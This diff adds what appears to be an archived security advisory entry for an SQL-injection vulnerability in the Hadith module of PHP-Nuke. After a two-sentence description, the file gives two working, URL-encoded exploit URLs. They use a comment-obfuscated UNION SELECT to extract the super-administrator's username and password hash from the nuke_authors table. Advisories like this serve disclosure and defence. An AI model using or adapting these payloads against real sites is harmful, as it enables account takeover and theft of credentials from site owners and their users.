@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/28171/info
+
+The Hadith module for PHP-Nuke is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+http://www.example.com/modules.php?modules.php?modload&name=Hadith&file=index&action=viewcat&cat=-1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2Caid%2F%2A%2A%2Ffrom%2F%2A%2A%2Fnuke_authors%2F%2A%2A%2Fwhere%2F%2A%2A%2Fradminsuper%3D1%2F%2A
+http://www.example.com/modules.php?modules.php?modload&name=Hadith&file=index&action=viewcat&cat=-1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2Cpwd%2F%2A%2A%2Ffrom%2F%2A%2A%2Fnuke_authors%2F%2A%2A%2Fwhere%2F%2A%2A%2Fradminsuper%3D1%2F%2A 
